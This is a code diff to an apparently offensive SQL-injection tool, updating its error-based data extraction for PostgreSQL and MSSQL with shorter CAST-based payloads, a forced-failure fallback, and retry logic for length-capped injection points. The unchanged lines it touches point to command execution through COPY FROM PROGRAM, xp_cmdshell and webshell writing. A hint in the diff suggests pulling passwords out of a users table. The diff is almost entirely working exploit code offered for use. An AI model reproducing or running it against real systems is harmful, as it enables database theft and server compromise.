@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.3"
+VERSION = "3.6.4"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -120,6 +120,7 @@ class Dbms:
     # --- error-based: SQL fragment (after AND/OR) that errors out leaking value
     error_hex = False                 # True if the leaked token is hex (decode at the end)
     def error_expr(self, inner): return None
+    def error_expr_forced(self, inner): return self.error_expr(inner)  # force a non-numeric cast fail
     def error_value(self, text):
         m = re.search(re.escape(DELIM) + "(.*?)" + re.escape(DELIM), text, re.S)
         return m.group(1) if m else None
@@ -171,13 +172,17 @@ class Postgres(Dbms):
     def sleep_stacked(self, cond, sleep):
         return f"SELECT pg_sleep({sleep}) WHERE {cond}"
     def error_expr(self, inner):
-        # '~' forces the int-cast to fail even for numeric values; no bulky delimiter
-        # wrapper, so the payload stays short enough to survive length-capped points.
+        # cast the value straight to int: a non-numeric value fails and the error quotes it.
+        # No delimiter wrapper, so the payload is short enough to survive a length-capped
+        # point (mirrors a hand-written  ' AND 1=CAST((..) AS int)--  exactly).
+        return f"1=CAST(({inner}) AS int)"
+    def error_expr_forced(self, inner):
+        # a purely numeric value casts cleanly (no error); '~' forces the failure.
         return f"1=CAST(('~'||({inner})) AS int)"
     def error_value(self, text):
         # read the value from the integer-cast error itself. Anchoring to that message
         # (not a bare delimiter) means a query echoed back in the page can't fool us.
-        m = re.search(r'invalid input syntax for (?:type )?integer:\s*"~(.*?)"', text)
+        m = re.search(r'invalid input syntax for (?:type )?integer:\s*"~?(.*?)"', text)
         return m.group(1) if m else None
     # RCE: COPY ... FROM PROGRAM (superuser) for exec; COPY (...) TO for webshell.
     can_exec = True
@@ -264,9 +269,11 @@ class MSSQL(Dbms):
     def sleep_stacked(self, cond, sleep):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
+        return f"1=CAST(({inner}) AS int)"
+    def error_expr_forced(self, inner):
         return f"1=CAST(('~'+CAST(({inner}) AS varchar(8000))) AS int)"
     def error_value(self, text):
-        m = re.search(r"converting the (?:var|n?var|n)?char value '~(.*?)'", text)
+        m = re.search(r"converting the (?:var|n?var|n)?char value '~?(.*?)'", text)
         return m.group(1) if m else None
     # RCE: enable + xp_cmdshell (sysadmin). Output captured into a table, read via oracle.
     can_exec = True
@@ -881,17 +888,24 @@ def detect(target, a):
 def extract_error(target, dbms, ctx, a, query=None):
     """One-shot (or chunked) dump via reflected error."""
     query = query if query is not None else a.query
+    def shoot(expr):
+        p = f"{ctx.close}{ctx.logic}{expr}{dbms.comment}"
+        return dbms.error_value(target.send(p).text)
+
     def leak(inner):
-        p = f"{ctx.close}{ctx.logic}{dbms.error_expr(inner)}{dbms.comment}"
-        tok = dbms.error_value(target.send(p).text)
+        tok = shoot(dbms.error_expr(inner))               # short, direct cast (fits tight caps)
         if tok is None and target.marker_prefix and not target.trim_prefix:
-            target.trim_prefix = True                 # likely a length cap: free room and retry
+            target.trim_prefix = True                     # length cap? drop the prefix and retry
             target._announce_trim()
-            tok = dbms.error_value(target.send(p).text)
+            tok = shoot(dbms.error_expr(inner))
+        if tok is None:                                   # numeric value? force a non-numeric fail
+            forced = dbms.error_expr_forced(inner)
+            if forced != dbms.error_expr(inner):
+                tok = shoot(forced)
         return tok
 
     if not dbms.error_trunc:
-        tok = leak(f"({query})")
+        tok = leak(query)
         return dbms.error_finalize(tok) if tok else tok
     # chunked for DBMS that truncate error text (e.g. MySQL). Accumulate the raw
     # tokens and finalize ONCE at the end so multibyte sequences aren't split.
@@ -1023,6 +1037,9 @@ def map_mode(target, det, a):
     print(f"Tables   : {len(tables)}")
     for t in tables:
         print(f"  - {t}")
+    if det.technique == "error-based" and not tables:
+        print("[!] no tables read — schema queries are long and this point looks length-capped.")
+        print('    extract directly, e.g.:  --query "SELECT password FROM users LIMIT 1"')
     print(f"\n[i] dump a table with:  --dump <table>   (rows capped by --max-rows)")
 
 
@@ -1340,7 +1357,13 @@ def main():
         val = union_read(target, det, a.query) if det.technique == "union-based" \
             else extract_error(target, det.dbms, det.ctx, a)
         if not val:
-            print(f"[!] {det.technique} returned nothing; try --no-union/--no-error to fall back.")
+            print(f"[!] {det.technique} returned nothing.")
+            if det.technique == "error-based":
+                print("    the value may be empty, or the point is length-capped and the query is "
+                      "too long — shorten it (one short column + LIMIT 1) or drop a fixed cookie "
+                      "prefix (use TrackingId=INJECT).")
+            else:
+                print("    try --no-union/--no-error to fall back, or --force-error.")
             sys.exit(1)
         print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
         return
